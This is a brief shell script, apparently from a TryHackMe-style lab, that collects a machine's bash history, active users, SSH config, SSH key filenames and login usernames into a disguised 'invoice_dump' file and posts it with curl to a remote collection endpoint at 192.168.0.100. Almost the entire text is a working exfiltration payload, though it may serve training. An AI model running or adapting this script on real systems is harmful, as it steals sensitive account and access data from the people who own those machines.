OUT="/tmp/invoice_dump.txt"

echo "[+] Collecting recent shell history" > $OUT
cat ~/.bash_history >> $OUT 2>/dev/null

echo -e "\n[+] Active users:" >> $OUT
who >> $OUT

echo -e "\n[+] SSH config if exists:" >> $OUT
cat ~/.ssh/config >> $OUT 2>/dev/null

echo -e "\n[+] SSH keys (listing only):" >> $OUT
ls -l ~/.ssh/id_* >> $OUT 2>/dev/null

echo -e "\n[+] Common usernames on the system:" >> $OUT
cut -d: -f1 /etc/passwd | grep -Ev "nologin|false" >> $OUT

curl -X POST -F "data=@$OUT" http://192.168.0.100:8080/collect.php
EOF


#thm{23,82,20,17,53}